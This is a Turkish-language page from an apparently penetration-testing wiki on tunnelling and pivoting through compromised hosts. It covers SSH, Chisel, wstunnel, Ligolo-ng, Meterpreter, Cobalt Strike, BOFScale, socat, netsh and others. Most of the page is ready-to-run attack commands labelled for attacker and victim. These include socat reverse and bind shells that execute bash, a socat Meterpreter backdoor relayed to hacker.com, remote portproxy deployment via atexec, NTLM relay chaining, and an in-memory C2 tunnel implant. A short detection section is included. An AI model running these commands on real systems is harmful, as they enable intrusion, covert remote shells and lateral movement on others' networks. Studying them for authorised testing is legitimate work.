# Tünelleme ve Port Yönlendirme

{{#include ../banners/hacktricks-training.md}}

## Nmap ipucu

> [!WARNING]
> Nmap'in proxy desteği TCP bağlantılarıyla sınırlıdır ve ping, port veya işletim sistemi tespit taramalarını etkilemez. Tarayıcı bir SOCKS proxy'sinin arkasındaysa, **host discovery'yi devre dışı bırakın** (`-Pn`) ve bir **TCP connect scan** kullanın (`-sT`).<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

Son komut, hesabı ve WinRM host'unu belirtmek için Evil-WinRM'nin `-u` ve `-i` seçeneklerini kullanır; varsayılan WinRM portu 5985'tir.<sup>[[4]](#references)</sup>

```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```

## **SSH**

OpenSSH, şifrelenmiş kanalı üzerinden X11 bağlantılarını, rastgele TCP portlarını ve Unix etki alanı soketlerini yönlendirebilir.<sup>[[6]](#references)</sup>

SSH grafik bağlantısı (X)

`-Y`, güvenilir X11 yönlendirmesini etkinleştirir ve `-C`, yönlendirilen veriler için sıkıştırma ister.<sup>[[6]](#references)</sup>

```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```

### Remote Port2Port

SSH Server'da yeni Port aç --> Diğer port

Remote (`-R`) forwarding, SSH sunucusunda dinler ve yerel tarafa bağlanır; açık bind address, hangi arayüzlerin bu dinleyiciye erişebileceğini belirler.<sup>[[6]](#references)</sup>

```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```

### Port2Port

Yerel port --> Ele geçirilmiş ana makine (SSH) --> Third_box:Port

Local (`-L`) yönlendirme, istemci üzerinde dinler ve hedefe SSH sunucusu tarafından bağlanır.<sup>[[6]](#references)</sup>

```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```

### Port2hostnet (proxychains)

Yerel Port --> Ele geçirilmiş host (SSH) --> Herhangi bir yer

Dynamic (`-D`) forwarding, bağlantıların uzak taraftan açıldığı yerel bir SOCKS4/SOCKS5 listener oluşturur.<sup>[[6]](#references)</sup>

```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```

### ProxyJump ile çok atlamalı bağlantı

`-J`/`ProxyJump`, hedefe virgülle ayrılmış bir veya daha fazla atlama ana bilgisayarı üzerinden bağlanır. Yönlendirme seçenekleri yine de son SSH bağlantısına aittir; bu nedenle aşağıdaki SOCKS dinleyicisi, ilk bastion'dan değil `internal-target` üzerinden hedeflere bağlanır. Böylece bir atlama ana bilgisayarında oturum açıp orada ikinci bir SSH istemcisi başlatmak gerekmez.<sup>[[6]](#references)</sup>

```bash
# Reach the final SSH server through two bastions
ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target

# Create a local SOCKS proxy whose connections exit from internal-target
ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
```

Jump makinelerine özgü seçenekler `~/.ssh/config` içine yerleştirilmelidir; hedefe yönelik komut satırı yapılandırması ara makinelere otomatik olarak uygulanmaz.<sup>[[6]](#references)</sup>

### Reverse Port Forwarding

Bu, dahili makinelerden DMZ üzerinden makinenize reverse shell almak için kullanışlıdır:

Sunucunun `GatewayPorts` ayarı, remote forward'ın loopback arayüzünün dışına bağlanıp bağlanamayacağını kontrol eder; varsayılanı `no` değeridir.<sup>[[7]](#references)</sup>

```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```

### VPN-Tunnel

Bu root tabanlı örnek, her iki hostta da tunnel cihazları oluşturur. Server, tun forwarding'e izin vermeli ve seçilen account'un tun cihazına erişimi olmalıdır; burada `root` account'unu kullanmanın bir yolu `PermitRootLogin yes` ayarını yapmaktır.<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`

```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```

Sunucu tarafında yönlendirmeyi etkinleştirin

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```

İstemci tarafında yeni bir rota ekleyin

```
route add -net 10.0.0.0/16 gw 1.1.1.1
```

> [!NOTE]
> **Güvenlik – Terrapin Attack (CVE-2023-48795)**  
> OpenSSH 9.6, Terrapin'in erken taşıma aşamasındaki bütünlük saldırısına karşı koymak için strict-KEX uzantısını ekledi. Mümkün olduğunda her iki ucu da güncelleyin ve eski uygulamalar için yalnızca sürümün yönlendirilen bir kanalı koruduğunu varsaymak yerine üretici yönergelerini izleyin.<sup>[[8]](#references)</sup>

## SSHUTTLE

Bir ana bilgisayar üzerinden bir alt ağa giden tüm trafiği **ssh** ile **tunnel** edebilirsiniz.\
Örneğin, 10.10.10.0/24 adresine giden tüm trafiği yönlendirmek için

`sshuttle`, SSH üzerinden şeffaf proxy desteği sunar ve aşağıda gösterildiği gibi alt ağları ve özel bir SSH komutunu seçmeyi destekler.<sup>[[9]](#references)</sup>

```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```

Özel anahtarla bağlanın

```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```

## Meterpreter

Metasploit'in `portfwd` özelliği yerel ve uzak yönlendirmeyi destekler. SOCKS proxy modülü ise session route'ları veya `autoroute` ile çalışacak şekilde tasarlanmıştır ve bu örneklerde varsayılan olarak 1080 portunu dinler.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Yerel port --> Ele geçirilmiş host (aktif session) --> Third_box:Port

```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```

### SOCKS

```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

Başka bir yol:

```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

## Cobalt Strike

Cobalt Strike'ın Beacon'ı, SOCKS4a/SOCKS5 bağlantılarını bir Beacon üzerinden aktarabilir; `rportfwd` ele geçirilmiş host üzerinde bağlanırken `rportfwd_local` hedef bağlantısını Cobalt Strike client'ından başlatır.<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Trafiği Beacon üzerinden yönlendirmesi gereken arayüzlerde Team Server'da bir port açın.<sup>[[13]](#references)</sup>

```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```

### rPort2Port

> [!WARNING]
> Bu durumda **port, Team Server'da değil Beacon host'ta açılır** ve trafik Team Server'a, oradan da belirtilen host:port'a gönderilir.<sup>[[14]](#references)</sup>

```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```

Reverse-forwarding kılavuzu şu davranışları belirtir:<sup>[[14]](#references)</sup>

- Beacon'ın reverse port forward özelliği **tek tek makineler arasında relay yapmak için değil, Team Server'a trafik tünellemek için tasarlanmıştır**.
- Trafik, P2P bağlantıları da dahil olmak üzere **Beacon'ın C2 trafiği içinde tünellenir**.
- Yüksek portlar genellikle privileged port kısıtlamalarını aşar; ancak hedef işletim sisteminin politikaları ve mevcut listener'lar yine geçerlidir.

### rPort2Port local

> [!WARNING]
> Bu durumda **port, Team Server'da değil Beacon host'unda açılır** ve **trafik Team Server'a değil, Cobalt Strike client'a gönderilir**; oradan da belirtilen host:port'a iletilir.<sup>[[14]](#references)</sup>

```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```

## BOFScale - CDN önündeki süreç içi tailnet

[BOFScale](https://github.com/NetSPI/BOFscale), TUN driver veya service yüklemeden, değiştirilmiş bir Tailscale overlay'ini Windows C2 implant içinde çalıştırır. Üç bileşenden oluşur: asenkron bir CGo `c-shared` `tailscaled` BOF-PE, local API ile iletişim kuran küçük bir C++ BOF-PE ve asenkron bir `socksportfwd` TCP-to-SOCKS5 bridge.<sup>[[53]](#references)[[54]](#references)</sup>

### CDN uyumlu TS2021 ve DERP

Tailscale, Noise tabanlı TS2021 control channel ve DERP relay için normalde özel HTTP upgrade'leri kullanır. BOFScale bu byte stream'lerini korur, ancak RFC 6455 WebSockets içinde taşır ve `Sec-WebSocket-Protocol: ts2021` veya `derp` kullanır. Böylece operatörün kontrolündeki bir Headscale/DERP origin, yalnızca standart WebSocket upgrade'lerini kabul eden bir CDN'in arkasında çalışabilir. Değiştirilmiş client, HTTP `500` sonrasında TS2021'i WebSockets üzerinden yeniden dener, HTTP `426` sonrasında DERP'i yeniden dener ve DERP WebSocket dialer'ın host proxy yapılandırmasına uymasını sağlar; BOF, başarısız olduğu bilinen ilk denemeyi atlamak için `TS_DEBUG_DERP_WS_CLIENT=1` ayarlar.<sup>[[53]](#references)[[54]](#references)</sup>

CDN ve origin proxy, `/ts2021` ve `/derp` için WebSocket upgrade'lerini korumalı, `/key` isteklerini sıradan HTTP olarak iletmeli ve relay oturumları süresiz açık kalabileceğinden dahili read/write timeout'larını devre dışı bırakmalıdır. Sağlanan Headscale yapılandırması `verify_clients` özelliğini etkinleştirir, yalnızca operatörün gömülü DERP map'ini yayımlar ve Tailscale tarafından işletilen relay'lere fallback yapılmasını önlemek için `derp.urls` değerini boş bırakır.<sup>[[53]](#references)[[54]](#references)</sup>

### Süreç içi daemon ve named pipe kontrolü

Üzerine yazılmadığı sürece BOF entry point'i `tailscaled`'ı `-tun=userspace-networking`, `-state mem:` ve `-no-logs-no-support` seçenekleriyle başlatır, ardından UUID adını taşıyan bir pipe oluşturur. Go stdout/stderr çıktısını bir OS pipe üzerinden Beacon output API'ye yönlendirir. Böylece daemon ve Go runtime'ın tamamı bellekte kalır; ancak state ve log'lar bir Tailscale dizinine yazılmaz.<sup>[[53]](#references)[[54]](#references)</sup>

Hafif client, pipe üzerinden Tailscale'in HTTP/1.0 local API'sini yeniden uygular. Daemon'ın `safesocket` katmanı pipe client'ını impersonate ettiğinden, pipe'ı `SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION` ile açar; `Tailscale-Cap: 125` gönderir ve local API'yi `up`, `down`, `status`, route advertisement ve shutdown işlemlerine eşler.<sup>[[53]](#references)[[54]](#references)</sup>

> [!WARNING]
> Daemon'a kapanmasını söyledikten sonra elle map'lenmiş bir Go BOF-PE'yi unload etmeyin: runtime ve garbage collector goroutine'leri, loader'ın unmap ettiği bellekten çalışmaya devam edebilir. Son temizlik için `tailscaled`'ı geçici bir process'te çalıştırın ve bu process'i sonlandırın.<sup>[[54]](#references)</sup>

### Host kaynaklı trafiği userspace SOCKS5 üzerinden köprüleme

Gelen tailnet bağlantıları ve ilan edilen subnet route'ları userspace network stack içinde çalışır, ancak ele geçirilmiş host üzerindeki normal process'lerin overlay'e OS route'u yoktur. Bu nedenle `socksportfwd`, victim tarafında erişilebilir bir TCP portunu dinler, daemon'ın `0.0.0.0:1080` listener'ı ile SOCKS5 `NO AUTH` görüşmesi yapar, bir tailnet hedefine yönelik `CONNECT` isteği gönderir ve trafiği her iki yönde asenkron olarak iletir. Hedef bir MagicDNS adı olduğunda `ATYP_DOMAIN` kullanır; böylece `tailscaled` adı çözümler ve adın Windows resolver'a açığa çıkması önlenir.<sup>[[53]](#references)[[54]](#references)</sup>

Aşağıda asgari bir operatör akışı gösterilmiştir; stock Tailscale bu CDN tasarımını kullanamadığından hem operatör node'u hem de implant, değiştirilmiş binary'leri kullanmalıdır.<sup>[[53]](#references)[[54]](#references)</sup>

```bash
HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
# Start tailscaled as an asynchronous BOF and copy its printed pipe name
tailscaled
tailscale --socket '\\.\pipe\<uuid>' up --auth-key <key> --login-server https://<cdn-hostname>
tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
```

Local forward, görünen kimlik doğrulama dinleyicisini relay aracından ayırabilir: bir makineyi, ele geçirilmiş host'un bağlı portunda kimlik doğrulamaya zorlayın, trafiği tailnet üzerinden `ntlmrelayx`'e yönlendirin ve AD CS, LDAP, HTTP, SMB veya uyumlu başka bir hedefe relay edin. Zafiyete özgü aşamalar için [WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) ve [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8) bölümlerine bakın; BOFScale yalnızca taşıma katmanıdır.<sup>[[54]](#references)</sup>

### Tespit

Tek bir zayıf belirti yerine şu göstergelerin bir arada bulunmasını araştırın: normalde Go tabanlı olmayan bir süreçte Go runtime, izinleri geniş olan `D:(A;;GA;;;WD)` SDDL'li bir UUID pipe, beklenmeyen bir `0.0.0.0:1080` SOCKS dinleyicisi ve CDN adreslerine uzun süreli TLS WebSocket bağlantıları. TLS incelemesi yapılıyorsa, sahibi yetkili bir `tailscaled` hizmeti olmayan süreçlerde `Sec-WebSocket-Protocol: derp` veya `ts2021` değerlerini işaretleyin. Depodaki `bofscale.yar` kuralları, üç BOF-PE bileşeninin tümü için bellek imzaları sağlar.<sup>[[53]](#references)[[54]](#references)</sup>

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Proje, `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp` ve `tunnel.php` gibi web tunnel uç noktaları sağlar; yerel proxy'yi başlatmadan önce desteklenen uç noktalardan birini yükleyin.<sup>[[15]](#references)</sup>

```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```

## Chisel

[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) adresindeki releases sayfasından indirebilirsiniz.\
Chisel, SSH korumalı bir bağlantı üzerinden TCP/UDP trafiğini HTTP ile taşır; uyumlu client/server derlemelerini kullanın ve seçilen sürümün komut sözdizimini doğrulayın.<sup>[[16]](#references)</sup>

### socks

```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```

### Port forwarding

```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```

## wstunnel

[`wstunnel`](https://github.com/erebe/wstunnel), statik veya dinamik yönlendirmeleri WebSocket, HTTP/2 ya da WebTransport (QUIC üzerinden HTTP/3) aracılığıyla taşır. Güncel sürümler TCP, UDP, Unix soketleri, stdio, SOCKS5, HTTP proxy ve Linux şeffaf proxy dinleyicilerini hem forward hem de reverse modlarda destekler.<sup>[[52]](#references)</sup>

### Ters SOCKS5 pivotu

Sunucuyu saldırgan makinede çalıştırın ve pivotun `-R` ile dışarıya bağlanmasını sağlayın. Bu bağlantı yönünde SOCKS5 dinleyicisi **sunucuda** oluşturulur; istenen bağlantılar ise **istemci/pivot** ağından başlatılır.<sup>[[52]](#references)</sup>

```bash
# Attacker: use a certificate valid for pivot.example
wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443

# Pivot: expose an attacker-side, loopback-only SOCKS5 listener
wstunnel client --tls-verify-certificate \
  -R 'socks5://127.0.0.1:1080' wss://pivot.example:443

# Attacker
proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
```

Reverse static forward aynı yönü kullanır. Örneğin aşağıdaki komut, pivot üzerinden erişilen `10.10.10.20:445` adresini saldırganın loopback arayüzündeki `8445` portunda kullanıma açar:<sup>[[52]](#references)</sup>

```bash
wstunnel client --tls-verify-certificate \
  -R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
```

### Çıkış ve aktarım ayrıntıları

- Açık bir HTTP proxy üzerinden geçmek için client'a `-p http://user:pass@proxy:8080` ekleyin. `curl` gibi client'larda `socks5h://127.0.0.1:1080` kullanın (veya uygulamada proxied DNS'i etkinleştirin); böylece dahili adlar yerel resolver'a leak edilmek yerine tünelin ötesinde çözümlenir.<sup>[[52]](#references)</sup>
- `wss://`, TLS korumalı WebSocket'i seçer. `https://` kullanan bir client HTTP/2'yi seçer, ancak reverse proxy/CDN'lerin uyguladığı buffering veya HTTP/1 dönüşümü çift yönlü akışı sıklıkla bozar; bu modu test ederken wstunnel server'ı doğrudan erişime açın.<sup>[[52]](#references)</sup>
- `wts://`, QUIC üzerinden WebTransport'ı seçer. Server'ı `--enable-webtransport` (veya `wts://` listen URL'si) ile başlatın ve dinleme portunda UDP'ye izin verin. Bu mod, geleneksel bir HTTP `CONNECT` proxy'sinden geçemez; çünkü bu proxy TCP taşır.<sup>[[52]](#references)</sup>

> [!WARNING]
> Upstream projesi, gömülü self-signed sertifikasının gizlilik koruması olarak değerlendirilmemesi gerektiği konusunda uyarıyor. Geçerli bir özel sertifika ve `--tls-verify-certificate` (veya mTLS) kullanın, uzaktan erişim kasıtlı değilse proxy listener'larını loopback'te tutun ve gizlilik önemli olduğunda zaten güvenli olan protokolleri tünelleyin.<sup>[[52]](#references)</sup>

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Ligolo-ng hızlı başlangıç kılavuzu; proxy üzerinde bir TUN interface'i, agent için sertifika parmak izi doğrulamasını ve tünellenen ağ için route kurulumunu belgeliyor.<sup>[[17]](#references)</sup>

### Tünelleme

```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```

### Agent Bağlama ve Dinleme

Ligolo-ng, agent üzerinde proxy tarafındaki bir adrese yönlendirme yapan listener'lar ekleyebilir ve ayrılmış `240.0.0.0/4` aralığı, agent üzerindeki yerel hizmetlere erişmek için route edilebilir.<sup>[[18]](#references)[[19]](#references)</sup>

```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```

### Agent'ın Yerel Portlarına Erişim

```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```

## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot, ters tüneli kurbandan başlatır ve saldırganın loopback adresinde bir SOCKS4 proxy'si sunar; README'sinde ayrıca NTLM proxy kimlik bilgileri ve hash seçenekleri belgelenmiştir.<sup>[[20]](#references)</sup>

```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```

Pivot through **NTLM proxy**

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat, `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL` ve `PROXY` gibi adres türlerini bir araya getirir; aşağıdaki örneklerde bu belgelenmiş uç noktalar birleştirilmiştir.<sup>[[21]](#references)</sup>

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

### Port2Port

```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```

### SOCKS üzerinden Port2Port

```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```

### SSL Socat üzerinden Meterpreter

```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```

socat'ın belgelenmiş `PROXY` adres türünü kullanarak, kurbanın konsolunda son satır yerine bu satırı çalıştırıp **kimlik doğrulaması gerektirmeyen bir proxy** üzerinden geçiş yapabilirsiniz.<sup>[[21]](#references)</sup>

```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```

[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tüneli

**/bin/sh console**

Her iki tarafta da sertifika oluşturun: İstemci ve Sunucu

```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```

### Remote Port2Port

Yerel SSH portunu (22), saldırgan ana bilgisayarının 443 portuna bağlayın.

```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```

## Plink.exe

Plink, `ssh`'ye benzer SSH forwarding seçeneklerine sahip PuTTY komut satırı bağlantı aracıdır.<sup>[[22]](#references)</sup>

SSH portu için büyük harfli `-P` kullanın. `-pw` geriye dönük uyumluluk için korunmuştur ancak parolayı işlem listesinde açığa çıkarır; mümkün olduğunda anahtar kimlik doğrulamasını veya `-pwfile` kullanmayı tercih edin.<sup>[[22]](#references)[[23]](#references)</sup>

Bu ikili kurban makinesinde çalıştırılacağından ve bir SSH istemcisi olduğundan, ters bağlantı için SSH hizmetini ve portunu açın; aşağıdaki örnek, yerel olarak erişilebilen bir portu saldırganın makinesine yönlendirmek için `-R` kullanır.<sup>[[22]](#references)</sup>

```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```

## Windows netsh

### Port2Port

Kalıcı `portproxy` kuralları oluştururken veya değiştirirken, ana bilgisayarın gerektirdiği izinlere sahip bir bağlam kullanın. Microsoft, aşağıda kullanılan `v4tov4` ekleme, gösterme ve silme biçimlerini belgeler.<sup>[[24]](#references)</sup>

```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

### Zamanlanmış görev aracılığıyla `portproxy` dağıtma

Yönetici kimlik bilgileri mevcut olduğunda, uzak Görev Zamanlayıcı yürütmesi özel bir relay yüklemeden yerel bir yönlendirme kuralı yükleyebilir. Örneğin, [Impacket `atexec`](../windows-hardening/lateral-movement/atexec.md), bir pivotun TCP/443 üzerinde dinlemesini ve bağlantıyı dahili bir SMB hizmetine aktarmasını sağlayabilir.<sup>[[57]](#references)[[58]](#references)</sup>

```bash
atexec.py 'DOMAIN/USER:PASSWORD'@<PIVOT> \
  'netsh interface portproxy add v4tov4 listenport=443 connectaddress=10.0.12.101 connectport=445'
```

Kural kalıcıdır; bu nedenle `netsh interface portproxy show v4tov4` komutuyla listeleyin ve testten sonra açıkça kaldırın. `portproxy` yalnızca yönlendirme sağlar; ana bilgisayar güvenlik duvarı da dinleme portuna izin vermelidir.<sup>[[24]](#references)</sup>

## SocksOverRDP & Proxifier

**Sisteme RDP erişiminizin** olması gerekir.\
İndirin:

SocksOverRDP, mevcut bir RDP oturumu üzerinden SOCKS5 bağlantısı taşımak için Remote Desktop Dynamic Virtual Channels kullanır; istemci eklentisi `127.0.0.1:1080` adresinde dinlerken sunucu bileşeni RDP hedefinde çalışır.<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Bu araç, Windows'un Remote Desktop Service özelliğindeki `Dynamic Virtual Channels` (`DVC`) özelliğini kullanır. DVC, **paketlerin RDP bağlantısı üzerinden tünellenmesinden** sorumludur.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

İstemci bilgisayarınızda **`SocksOverRDP-Plugin.dll`** dosyasını şu şekilde yükleyin:

```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

Artık **`mstsc.exe`** kullanarak **RDP** üzerinden **kurban** makineye **bağlanabiliriz**. **SocksOverRDP eklentisinin etkin olduğunu** belirten bir **istem** almalı ve eklenti **127.0.0.1:1080** adresinde **dinlemelidir**.

**RDP** üzerinden **bağlanın** ve `SocksOverRDP-Server.exe` ikili dosyasını kurban makineye yükleyip çalıştırın:

```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```

Şimdi, makinenizde (saldırgan) 1080 portunun dinlemede olduğunu doğrulayın:

```
netstat -antb | findstr 1080
```

Artık trafiği bu port üzerinden proxy’lemek için [**Proxifier**](https://www.proxifier.com/) kullanabilirsiniz.<sup>[[26]](#references)</sup>

### RDP sanal kanal avcılığı

